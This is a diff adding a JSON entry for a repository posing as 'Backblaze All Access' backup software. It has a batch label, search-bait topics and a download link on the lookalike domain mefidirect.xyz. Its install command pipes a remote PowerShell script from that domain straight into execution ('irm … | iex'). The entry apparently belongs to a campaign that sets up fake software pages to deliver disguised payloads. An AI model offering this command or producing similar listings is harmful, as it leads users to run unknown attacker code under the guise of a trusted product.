@@ -1,0 +1,30 @@
+{
+  "repo": "backblaze-all-access",
+  "product": "Backblaze All Access",
+  "kind": "backup",
+  "install_type": "download",
+  "download_url": "https://backblaze.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "backup",
+  "topics": [
+    "backblaze-stable-build",
+    "backblaze-local-install",
+    "file-sync",
+    "getting-started",
+    "backblaze-install-steps",
+    "backblaze-app",
+    "backblaze-package",
+    "user-manual",
+    "offsite-storage",
+    "install-guide",
+    "windows-11",
+    "backblaze-latest-build",
+    "backblaze-workspace",
+    "secure-storage",
+    "windows-10",
+    "restore-points"
+  ]
+}
